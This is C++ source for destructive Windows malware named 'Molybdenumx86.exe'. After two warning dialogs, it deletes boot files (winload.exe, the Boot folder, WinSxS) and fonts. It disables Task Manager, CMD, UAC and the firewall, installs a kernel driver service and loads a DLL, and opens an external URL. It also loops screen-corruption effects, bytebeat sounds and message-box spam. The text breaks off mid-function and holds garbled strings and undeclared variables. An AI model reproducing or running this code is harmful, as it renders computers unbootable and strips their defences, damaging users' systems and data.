DWORD WINAPI E02034d(LPVOID lpParam)
{
	ShellExecuteA(NULL, "open", "explorer", NULL, NULL, SW_SHOW);
	ShellExecuteA(NULL, "open", "notepa", NULL, NULL, SW_SHOW);
	Sleep(300000);
	return 0x00;
}
DWORD WINAPI D02034d(LPVOID lpParam)
{
	ShellExecuteA(NULL, "open", "explorer", "shell:MyComputerFolder", NULL, SW_SHOW);
	Sleep(250000);
	return 0x00;
}
DWORD WINAPI C02034d(LPVOID lpParam)
{
	string fontPath = "\"C:\\Arial\\ariali.ttf\"";
	string command = "start " + fontPath;
	return 0;
}
DWORD WINAPI Dle(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			rgbScreen[i].rgb = (rgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, -30, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, w - 30, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -30, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, h - 30, SRCCOPY);
		//BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
	}
	ReleaseDC(NULL, hdcScreen);
	DeleteDC(hdcMem);
	SelectObject(0, hbmTemp);
	return 0x00;
}
DWORD WINAPI last(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			int randPixel = Xorshift32() % w;
			int tempB = GetBValue(data[i].rgb);
			data[i].rgb = RGB(GetBValue(data[randPixel].rgb), GetBValue(data[randPixel].rgb), GetBValue(data[randPixel].rgb));
			data[randPixel].rgb = RGB(tempB, tempB, tempB);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		ReleaseDC(0, hdcdc);
		DeleteObject(hbm);
	}
	return 0x00;
}
DWORD WINAPI FCD(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)NULL, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, -30, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, w - 30, 0, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, -30, SRCCOPY);
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, h - 30, SRCCOPY);
		//BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(100);
	}
	ReleaseDC(NULL, hdcScreen);
	DeleteObject(hbmTemp);
	DeleteDC(hdcMem);
	return 0x00;
}
DWORD WINAPI qu0517(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateCompatibleBitmap(deskMem, sw, sh);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(0, desk);
		DeleteObject(deskMem); DeleteObject(wnd);
		Sleep(800);
	}
}
DWORD WINAPI d1985(LPVOID lpParam)
{
	DEVMODEW dm{};
	dm.dmSize = sizeof(DEVMODEW);
	if (!EnumDisplaySettingsW(NULL, ENUM_CURRENT_SETTINGS, &dm))
		return DISP_CHANGE_FAILED;

	dm.dmPelsWidth = 800;
	dm.dmPelsHeight = 600;
	dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT;

	LONG rc = ChangeDisplaySettingsExW(NULL, &dm, NULL, CDS_TEST, NULL);
	if (rc != DISP_CHANGE_SUCCESSFUL)
		return (DWORD)rc;

	rc = ChangeDisplaySettingsExW(NULL, &dm, NULL, 0, NULL);
	return (DWORD)rc;
}
DWORD WINAPI o01(LPVOID lpParam)
{
	system("copy p2phook.sys C:\\Windows\\System32\\drivers\\p2phook.sys");
	system("sc create p2phook binPath= C:\\Windows\\System32\\drivers\\p2phook.sys type= kernel start= auto");

	HINSTANCE hinstLib = LoadLibrary(TEXT("safemon.dll"));
	if (hinstLib != NULL) {
		typedef void (*P2PRFUNC)();
		P2PRFUNC p2pr = (P2PRFUNC)GetProcAddress(hinstLib, "p2pr");
		if (p2pr != NULL) {
			p2pr();
		}
		FreeLibrary(hinstLib);
	}


	system("iexplore http://xytets.com:2345/t.asp?1002vm");

	return 0;
}
DWORD WINAPI o02(LPVOID lpParam)
{
	system("del C:\\Windows\\Fonts");
	return 0x00;
}
DWORD WINAPI Tam(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	double angle = 0;
	while (1) {
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.0f) {
			int a = sin(angle) * 14;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			angle += M_PI / 118;
		}
		Sleep(15);
	}
	ReleaseDC(0, desk);
	return 0x00;
}
DWORD WINAPI o0234(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	return 0;
}
DWORD WINAPI o001(LPVOID lpParam) {
	fs::remove_all("\\\\.\\C:/Windows/System32/winload.exe");
	fs::remove_all("\\\\.\\C:/Windows/Boot");
	fs::remove_all("\\\\.\\C:/Windows/WinSxS");
	return 0;
}

VOID WINAPI sound1()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12500, 12500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 11 | t >> 10)) >> (t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t & t >> 12) * (t >> 4 | t >> 8);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[8000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * ((t | t >> 5) >> (t >> 15)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 23500, 23500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[23500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 2 >> (static_cast<int>(t * 4.5) >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};

	for (int t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>(t + (int(t & ((t >> 15) + ((t >> 9) & t))) * t + (((t >> 5 & t) - (t >> 1 & t >> 1 | t >> 8)) & 128)) + 1);
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 30] = {};

	for (int t = 0; t < sizeof(buffer); ++t) {
		buffer[t] = static_cast<char>((t & ((t >> 18) + ((t >> 11) & t))) * t + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));
	}

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound7()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16500, 16500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(1 * (int(t & ((t >> 12) + ((t >> 7) & t))) * t + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128)) + 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound8()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[22050 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t & ((t >> 18) + ((t >> 11) & 60))) * 100 + (((t >> 8 & t) - (t >> 3 & t >> 8 | t >> 16)) & 128));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound9()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 17500, 17500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t ^ t + (t >> 11 | 0) / (t - 12000 ^ t) >> 11));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 25000, 25000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 ^ t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 ^ -t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 15] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * rand());

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 + t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 + -t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24500, 24500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[24500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 6 + t & t >> 9 ^ t >> 12 | (t << (t >> 6) % 4 ^ -t & -t >> 13) % 128 + -t >> 1);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound14()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 34000, 34000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[34000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((cbrt(cos((t * (1 + (t >> 14 | t >> 51) % 4)) / 19)) * (16 + (t >> 8 & 42)) + (int)(sin((t * t * t / 9) / 41) * 10) + 70));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 28] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast < char>(110 * ((t << 1 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound16()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 15] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast < char>(20 * t * t * (t >> 11) / 7);

		WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound17()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 15] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>(t / (t % (t >> 8 | t >> 16)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound18()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 45000, 45000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[45000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>((t & t / 2 & t / 4) * t / 4E3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound19()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12000, 12000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(
			z = (x = ((a = t + 16777216) & (a >> 7)) + a / 32768),
			y = -x | (x * a << 8),
			(z / y) | (y / x)
			);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound20()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12000, 12000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 5 | t >> 8)) >> (t >> 16);
	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound21()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12500, 12500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t & 16384 ? 7 : 5) * (3 - (3 & t >> 9) + (3 & t >> 8)) >> (3 & -t >> (t & 4096 ? 2 : 16)) | t >> 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound22()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12000, 12000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 2 | t >> 9)) >> (t >> 19);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound23()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 40] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>(t * (((t >> 800 | t << 10)))) >> (~t >> 4) / 1 - t / ~4;

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound24()
{
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 12500, 12500, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[12500 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast <char>(10 ^ ((((t * (2 + (t >> 12 | t >> 12 | t >> 19) % 5)) / 11)) * (8 + (t >> 8 & 52)) + (int)(log(((t * t * t / 9) / 41) * 10) + 70)) ^ 1 / 2 * 3);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
DWORD WINAPI gnb(LPVOID lpParam) {
	while (1) {
		MessageBox(NULL, randomStr.c_str(), L"æ¯”è¾ƒè¾“å…¥çš„éªŒè¯ç å’Œå®žé™…ç”Ÿæˆçš„éªŒè¯ç æ˜¯å¦ç›¸å", MB_ICONERROR | MB_CANCELTRYCONTINUE | MB_RTLREADING);
	}
	return 0;
}
int main(int argc, char** argv) {
	if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Molybdenumx86.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Molybdenumx86.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			system("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f >nul");
			system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f >nul");
			system("netsh advfirewall set allprofiles state off >nul 2>&1");
			HANDLE hFile = CreateFileW(L"æ¯”è¾ƒè¾“å…¥çš„éªŒè¯ç å’Œå®žé™…ç”Ÿæˆçš„éªŒè¯ç æ˜¯å¦ç›¸å.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile != INVALID_HANDLE_VALUE) {
				WCHAR txtContent[] = L"鐜板湪濂逛滑琚滑琚�垜鐨勫�闀挎暀鑲蹭簡涓嶈繃锛屽ス浠�技涔庤繕鍦ㄩ獋鎴戯紝鎴鎴戣�鎬庝箞鍔�.....";
				DWORD writeLen;
